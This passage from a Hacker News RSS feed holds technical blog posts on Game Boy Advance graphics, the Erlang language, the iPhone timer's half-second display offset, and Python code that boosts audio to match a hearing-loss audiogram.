5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/game-boy-advance/">https://www.copetti.org/writings/consoles/game-boy-advance/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/game-boy-advance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564619</guid>
            <pubDate>Mon, 28 Dec 2020 23:32:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Erlang: The Programming Language That Quietly Powers WhatsApp and WeChat]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564176">thread link</a>) | @factandfiction
<br/>
December 28, 2020 | https://serokell.io/blog/introduction-to-erlang | <a href="https://web.archive.org/web/*/https://serokell.io/blog/introduction-to-erlang">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don’t have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company – Joe Armstrong, Robert Virding, and Mike Williams – decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I’ve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you’ve used Akka on JVM, you’ll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don’t discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won’t find tutorials for everything. It’s not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language’s functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today’s multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto – <a href="https://verraes.net/2014/12/erlang-let-it-crash/">“let it crash”</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I’ll try to bring insight into how an Erlang app is structured and how the “let it crash” philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let’s see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes – the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn’t solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn’t the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by José Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn’t actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir’s advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir’s advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you’ve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you’re into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves – an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You’re eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That’s reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You’re a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately. It will give you more job opportunities and will be easier to learn.</p><p>Afterward, you can learn Erlang and what makes it tick. Knowing how Erlang functions underneath Elixir will help you write better Elixir code and make you more likely to get hired as an Elixir developer.</p><p>Anyway, I don’t think you will regret any part of journeying BEAM, even though it is not all sunshine and rainbows (BEAM languages can get quite weird sometimes). If you are wondering where to start, I’d guide you either to <a href="https://learnyousomeerlang.com/">Learn You Some Erlang for Great Good!</a> or our beginner’s guide on <a href="https://serokell.io/blog/learn-elixir">learning Elixir</a>.</p><p>If you would like to read more posts on BEAM languages, don’t be afraid to also follow us on <a href="https://twitter.com/serokell">Twitter</a> or <a href="https://serokell.medium.com/">Medium</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/introduction-to-erlang</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564176</guid>
            <pubDate>Mon, 28 Dec 2020 22:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the iPhone Timer app displays a fake time]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 74 (<a href="https://news.ycombinator.com/item?id=25563708">thread link</a>) | @_antix
<br/>
December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://mp.weixin.qq.com/s/VDmjQacZNEmnynN6PylFhw" title="Chinese translation of this article">本文的中文翻译</a></p>
<p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-temp.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions-temp.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone-temp.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds-temp.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>
<h3 id="references"><a href="#references">¶</a> References:</h3>
<ul>
<li><a href="https://codepen.io/lhermann/pen/wvzPxXj">The code from the animations in this article</a></li>
</ul>
</div><div><p>I would love to hear from you if this article was helpful or if you have any questions</p><a href="https://twitter.com/_lhermann">Twitter</a></div></div>]]>
            </description>
            <link>https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563708</guid>
            <pubDate>Mon, 28 Dec 2020 21:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimenting on My Hearing Loss]]>
            </title>
            <description>
<![CDATA[
Score 139 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25562273">thread link</a>) | @paddlesteamer
<br/>
December 28, 2020 | https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/ | <a href="https://web.archive.org/web/*/https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    

<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/deafsign.png" title="Hear"></p><p><strong>WARNING: Some of the audios shared in this blog post may be disturbing and hurt your/your pet’s ears. Don’t play them at high volume.</strong> </p>
<p>I have a slight <a href="https://en.wikipedia.org/wiki/Sensorineural_hearing_loss" target="_blank" rel="noopener">sensorineural hearing loss</a> in both of my ears from birth. My hearing loss isn’t that serious but I need to use hearing aids in my daily life. Lately, I was thinking about altering my computer’s audio output according to my <a href="https://en.wikipedia.org/wiki/Audiogram" target="_blank" rel="noopener">audiogram</a>. An audiogram is basically a frequency-dB threshold graph. You can see my audiogram below:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/audiogram.png" title="audiogram"></p>

<p>It’s easy to read an audiogram. In audiograms, 0 dB indicates the quietest sound that a normal young person can hear. Here, the red line shows my right ear’s threshold values and the blue one belongs to my left ear’s. Let’s follow the red line. According to my audiogram, at the frequency of 250 Hz, the lowest I can hear is the sounds at 25 dB. At 6000Hz, I can’t hear any sound below 60 dB. Audiograms usually show threshold dBs between 125 Hz and 8000 Hz because that is the frequency range of the human voice.</p>
<p>What I want to do is to add a dynamic gain to the output audio depending on its frequency range. Simply, I want to be able to use my computer without the need for my hearing aids. To achieve this, I’m going to write a <a href="https://ladspa.org/" target="_blank" rel="noopener">LADSPA</a> plugin and use it with <a href="https://www.freedesktop.org/wiki/Software/PulseAudio/" target="_blank" rel="noopener">Pulseaudio</a>. Here is my previous <a href="https://0x90.psaux.io/2020/12/07/How-To-Write-A-LADSPA-Plugin/">post</a> on how to write one. In this post, I won’t get into LADSPA, I’ll just talk about my explorations on some audio files. </p>
<p>Before we start you may want to read about <a href="https://en.wikipedia.org/wiki/Sampling_(signal_processing)" target="_blank" rel="noopener">sampling</a> and <a href="https://en.wikipedia.org/wiki/Fourier_transform" target="_blank" rel="noopener">fourier transform</a>. A better explanation of the fourier transform could be found <a href="http://www.jezzamon.com/fourier/index.html" target="_blank" rel="noopener">here</a>. </p>
<p>First, let’s generate audio from sine waves with frequencies from 440 Hz to 8000 Hz and a sample rate of 44100 Hz:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span></span><br><span><span><span>def</span> <span>generateSamples</span><span>(sampleRate)</span>:</span></span><br><span>    startFreq = <span>440</span> </span><br><span>    endFreq = <span>8000</span> </span><br><span></span><br><span>    freqInc = <span>20</span> </span><br><span>    incPeriod = <span>0.05</span> </span><br><span></span><br><span>    incSampleCount = int(sampleRate*incPeriod)</span><br><span>    samples = np.array([])</span><br><span></span><br><span>    freq = startFreq</span><br><span>    t = <span>0.0</span></span><br><span>    <span>while</span> freq &lt; endFreq:</span><br><span>        tarray = np.linspace(t, t + incPeriod, incSampleCount, endpoint=<span>False</span>)</span><br><span></span><br><span>        newSamples = np.sin(<span>2</span> * np.pi * freq * tarray)</span><br><span>        newSamples *= <span>0.05</span> </span><br><span></span><br><span>        samples = np.append(samples, newSamples)</span><br><span></span><br><span>        freq += freqInc</span><br><span>        t += incPeriod</span><br><span></span><br><span>    <span>return</span> samples</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span></span><br><span>    samples = generateSamples(sampleRate)</span><br><span></span><br><span>    wavfile.write(<span>"generated.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>And the output is:</p>



<p>What we’re going to do is, first take a little part of the samples that we have generated. This will be our <em>window</em>. We’ll do a Fourier transform on this window and get into the frequency domain. Then we’ll find the frequency with the highest <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">dB</a> which will be our dominant frequency. We’ll determine how much gain is needed at that frequency according to the audiogram and apply it to the window. We’ll repeat this for all windows. We’re going to use <em>python</em> to achieve all this for the sake of convenience.</p>
<p><code>audiogram</code> variable keeps values of the above audiogram at the beginning of this post. <code>basedB</code> is rather an important variable. We’ll calculate our gain according to it. Let’s say, if we find that a window has a dominant frequency of 4000 Hz, then we need to apply <code>60.0 - 20.0 = 40.0 dB</code> gain to that window. It’s just the difference between how much normal people hear and how much I hear. That’s why the <code>basedB</code> variable should be chosen from the normal people’s hearing range.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span><span>import</span> sys</span><br><span></span><br><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>25.0</span>],</span><br><span>    [<span>250.0</span>,  <span>25.0</span>],</span><br><span>    [<span>500.0</span>,  <span>25.0</span>],</span><br><span>    [<span>1000.0</span>, <span>45.0</span>],</span><br><span>    [<span>2000.0</span>, <span>50.0</span>],</span><br><span>    [<span>4000.0</span>, <span>60.0</span>],</span><br><span>    [<span>6000.0</span>, <span>60.0</span>]</span><br><span>]</span><br><span></span><br><span></span><br><span></span><br><span>basedB = <span>25.0</span> </span><br></pre></td></tr></tbody></table></figure>

<p>Here is the function that will calculate dominant frequency. What it does is simple: it applies a fourier transform to the given window, finds the index of highest amplitude, and finally returns the corresponding frequency value.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    <span>for</span> i <span>in</span> range(int(windowSize/<span>2</span>)):</span><br><span>        <span>if</span> yf[i] &lt;= maxAmp:</span><br><span>            <span>continue</span></span><br><span></span><br><span>        maxAmp = yf[i]</span><br><span>        maxAmpIdx = i</span><br><span></span><br><span>    </span><br><span>    freq = (sampleRate/<span>2</span>)*maxAmpIdx/(windowSize/<span>2</span>)</span><br><span></span><br><span>    <span>return</span> freq</span><br></pre></td></tr></tbody></table></figure>

<p><code>getGain</code> finds the threshold value according to the audiogram and returns its difference from the <code>basedB</code> value. That’s the gain we want to apply to our window.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getGain</span><span>(freq)</span>:</span></span><br><span>    threshold = <span>0.0</span></span><br><span></span><br><span>    <span>if</span> freq &lt; audiogram[<span>0</span>][<span>0</span>]:</span><br><span>        threshold = audiogram[<span>0</span>][<span>1</span>]</span><br><span>    <span>else</span>:</span><br><span>        found = <span>False</span></span><br><span>        <span>for</span> i <span>in</span> range(len(audiogram)<span>-1</span>):</span><br><span>            <span>if</span> freq &gt;= audiogram[i+<span>1</span>][<span>0</span>]:</span><br><span>                <span>continue</span></span><br><span></span><br><span>            threshold = (audiogram[i+<span>1</span>][<span>1</span>] - audiogram[i][<span>1</span>]) * (freq - audiogram[i][<span>0</span>]) \</span><br><span>             / (audiogram[i+<span>1</span>][<span>0</span>] - audiogram[i][<span>0</span>]) + audiogram[i][<span>1</span>]</span><br><span></span><br><span>            found = <span>True</span></span><br><span>            <span>break</span></span><br><span></span><br><span>        <span>if</span> <span>not</span> found:</span><br><span>            threshold = audiogram[<span>-1</span>][<span>1</span>]</span><br><span></span><br><span>    <span>return</span> threshold - basedB</span><br></pre></td></tr></tbody></table></figure>

<p>Simple function to convert dB to amplitude. See <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">demofox’s blog</a>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>dBToAmplitude</span><span>(dB)</span>:</span></span><br><span>    <span>return</span> np.power(<span>10.0</span>, dB / <span>20.0</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>And now the main part. Here you can see that, first, the <code>wav</code> file is loaded into memory as samples, then the samples are iterated over in chunks of <code>window</code> with the size of <code>1024</code>,  <code>getDominantFreq</code> and <code>getGain</code> functions are called on and a gain was applied to those <code>window</code>s accordingly. At the last step, the new samples are written into <code>processed.wav</code> file. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    </span><br><span>    sampleRate, samples = wavfile.read(sys.argv[<span>1</span>], mmap=<span>True</span>)</span><br><span></span><br><span>    </span><br><span>    outSamples = np.array([])</span><br><span></span><br><span>    windowSize = <span>1024</span></span><br><span>    sampleIdx = <span>0</span></span><br><span>    <span>while</span> sampleIdx &lt; len(samples):</span><br><span>        window = samples[sampleIdx:sampleIdx+windowSize]</span><br><span></span><br><span>        freq = getDominantFreq(sampleRate, window)</span><br><span>        gain = getGain(freq)</span><br><span></span><br><span>        amp = dBToAmplitude(gain)</span><br><span></span><br><span>        amplified = window * amp</span><br><span>        outSamples = np.append(outSamples, amplified)</span><br><span></span><br><span>        sampleIdx += windowSize</span><br><span></span><br><span>    wavfile.write(<span>"processed.wav"</span>, sampleRate, outSamples)</span><br></pre></td></tr></tbody></table></figure>

<p>Now let’s run our code on the sine waves we’ve generated:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py generated.wav</span><br></pre></td></tr></tbody></table></figure>



<p>We can see that higher gain is applied to higher frequencies which is what we want. Let’s try this in a real-world example. Now take a look at the little part of one of my favorite books: </p>



<p>Let’s run our code with this recording:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py canticle_for_liebowitz.wav</span><br></pre></td></tr></tbody></table></figure>



<p>Damn. It hurts my ears. The problem  here is we’re applying gain even though it’s in my hearing range. For example, we shouldn’t add gain to 65 dB audio at any frequency. Also even if it’s out of my hearing range, we shouldn’t boost it too much. Let’s say if we have an audio with 55 dB at 4000 Hz, we shouldn’t amplify it to 85 dB which is too high. All we have to do is to shift it into my hearing range. </p>
<p>But what is 55 dB? For example, when we have an amplitude of 0.1, we can calculate the dB equivalent as <code>20 * log(0.1) = -20 dB</code>. Or we know 0 dB is full boost of the volume by <code>10^(0/20) = 1.0</code>. So, again, what the hell is 55 dB in “audiogram language” supposed to be?  </p>
<p>The answer lays in <strong>dB HL</strong> and <strong>dB SPL</strong>. HL stands for <em>Hearing Level</em> and SPL stands for <em>Sound Pressure Level</em>. dB SPL is basically the measurement of sound pressure. So the sound that makes no pressure is 0 dB and others are higher than 0 dB. Hearing levels are dB SPLs that are tailored for an audiogram. Do you remember in audiograms people’s hearing range starts from 0 dB? Well, that 0 dB HL is higher than 0 dB on the SPL scale and is different at every frequency because of how much the human ear hears. <a href="https://hearinglosshelp.com/blog/understanding-the-difference-between-sound-pressure-level-spl-and-hearing-level-hl-in-measuring-hearing-loss/" target="_blank" rel="noopener">Here</a> is a good reading on it.</p>
<p>There are many dB HL to dB SPL conversion charts. These conversions vary between the audiometers and the earphones used on those audiometers.</p>
